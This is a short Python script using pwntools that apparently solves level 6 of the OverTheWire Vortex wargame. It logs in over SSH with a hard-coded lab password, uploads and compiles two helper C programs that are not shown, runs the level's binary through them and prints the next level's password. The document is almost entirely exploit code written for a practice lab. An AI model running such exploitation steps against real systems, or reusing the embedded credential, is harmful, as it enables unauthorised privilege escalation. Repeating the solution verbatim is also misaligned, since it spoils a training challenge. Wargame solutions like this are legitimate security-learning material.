from pwn import *

s = ssh(host='vortex.labs.overthewire.org', user='vortex6', password='*uy5qDRb2')

s.upload_file('launcher.c', remote='/tmp/launcher.c')
s.run_to_end('gcc -m32 -o /tmp/launcher /tmp/launcher.c', wd='/tmp')

s.upload_file('readflag.c', remote='/tmp/readflag.c')
s.run_to_end('gcc -m32 -o /tmp/readflag /tmp/readflag.c', wd='/tmp')

out, code = s.run_to_end('/tmp/launcher /vortex/vortex6 /tmp/readflag')
assert code == 0

log.success('Password: %s' % out.strip())
